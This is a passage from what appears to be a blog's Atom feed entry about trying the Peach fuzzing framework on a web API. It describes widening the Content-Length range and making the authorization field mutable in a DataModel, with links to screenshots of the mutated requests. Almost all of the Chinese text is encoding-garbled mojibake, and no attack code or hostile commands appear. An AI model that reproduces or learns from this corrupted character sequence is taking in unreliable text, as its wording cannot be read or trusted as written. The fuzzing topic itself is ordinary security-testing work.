ä¸ºé•¿åº¦å¦‚æœä¸€ç›´æ˜¯å›ºå®šçš„è¯å‘é€çš„è¯·æ±‚å¤´è¯¥æ€ä¹ˆè¿›è¡Œé•¿åº¦å˜å¼‚ï¼Ÿä¸è¿‡åœ¨æ£€æµ‹æŠ¥æ–‡æ—¶è¿˜æ˜¯è§‚å¯Ÿåˆ°æŸäº›è¯·æ±‚æŠ¥æ–‡çš„â€Content-Lengthâ€æ˜¯ä¼šæ”¹å˜çš„ï¼Œä¸è¿‡æ˜¯æå°‘æ•°ï¼Œå¦‚ä¸‹ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/138332/21/29339/258119/63f31074Fab9ff6f9/8a782e9e75153d37.png" style="zoom:80%;" /><p>å¤§éƒ¨åˆ†æ˜¯ç¼ºå‚æ•°çš„ï¼Œå¦‚ä¸‹ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/111442/11/31651/192774/63f31074F6b9a25a5/0c9623296ed13b49.png" style="zoom: 67%;" /><p>æ‰“ç®—æ˜å¤©æ”¹è¿›ä¸€ä¸‹DataModelè¿™æ ·å­ã€‚</p><hr><p>éš”å¤©å®è·µäº†ä¸€ä¸‹ï¼Œå‘ç°å°†binä¸­å’Œdatamodelä¸­çš„â€Content-Lengthâ€æ”¹å¤§åï¼Œå°±ä¾‹å¦‚æˆ‘è®¾ç½®äº†1000ï¼Œé‚£ä¹ˆæˆ‘çš„è¯·æ±‚ä½“çš„é•¿åº¦èŒƒå›´ä¾¿æ˜¯[0,1000]ï¼ŒèŒƒå›´è®¾ç½®è¶Šå¤§è¶Šå¥½ã€‚å¦‚æˆ‘æ‰€æ–™ï¼Œå˜å¼‚è¯·æ±‚ä½“çš„é•¿åº¦å˜åŒ–äº†å¾ˆå¤šï¼Œä¹Ÿå°è¯äº†æˆ‘å‰å‡ å¤©çš„æ€è€ƒã€‚åŒæ—¶æˆ‘è¿˜ä¿®æ”¹äº†å‚æ•°authorizationçš„å€¼ä¸ºå¯å˜ã€‚è™½ç„¶ä»ç„¶è·‘ä¸å‡ºå¼‚å¸¸ç»“æœå°±å¯¹äº†ã€‚ï¼ˆå½“ç„¶å¾ˆæœ‰å¯èƒ½æ˜¯è¿™é“é¢˜çš„è€ƒç‚¹å°±ä¸åœ¨è¿™é‡Œï¼‰ã€‚ä»¥ä¸‹æ˜¯ä»Šå¤©è·‘å‡ºçš„å„ç±»å˜å¼‚è¯·æ±‚ä½“ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32032/12/21330/196376/63f3108fFd6f8f835/a1fa56905ef5b86b.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/106804/13/25217/180378/63f31074F30ae7716/f2c31195589d6f73.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/138287/24/33317/131526/63f3116bF492f304c/deda6ef59252705d.png"  /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/198394/7/30757/129740/63f31146F6a2daa04/160c56927739fa38.png"  /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/110505/27/35272/79810/63f31147F55d19a83/91cc7631539cb7fa.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/185169/19/29635/140331/63f31159Ff819f253/47d04247431b6e8f.png"  />]]></content>
    
    
    <summary type="html">&lt;p&gt;ç½‘ä¸Šå…³äºpeachæ¡†æ¶çš„èµ„æ–™å°‘çš„å¯æ€œã€‚æœ€åè·Ÿç€ä¸€ä½åšä¸»çš„åšå®¢å­¦äº†ä¸‹æ¥ï¼Œä¸è¿‡å­¦çš„æ˜¯Fuzz Web Apiã€‚å°±æ˜¯ä¸‹é¢çš„åšå®¢ã€‚æ„Ÿè°¢å¤§ä½¬ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_27446553/article/details/103278465?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.no_search_link&amp;spm=1001.2101.3001.4242.3&amp;utm_relevant_index=7&quot;&gt;PeachåŸç†ç®€ä»‹ä¸å®æˆ˜ï¼šä»¥Fuzz Web APIä¸ºä¾‹&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ¥ä¸‹æ¥å°±ç®€å•è®°å½•ä¸€ä¸‹ä»Šå¤©ä¸‹åˆå¯¹peachæ¡†æ¶çš„ç²—æµ…å°è¯•ã€‚&lt;/p&gt;
&lt;h3 id=&quot;ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º&quot;&gt;&lt;a href=&quot;#ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º&quot; class=&quot;headerlink&quot; title=&quot;ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º&quot;&gt;&lt;/a&gt;ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º&lt;/h3&gt;</summary>
    
    
    
    <category term="fuzz" scheme="http://example.com/categories/fuzz/"/>
    
    
  </entry>
  
</feed>
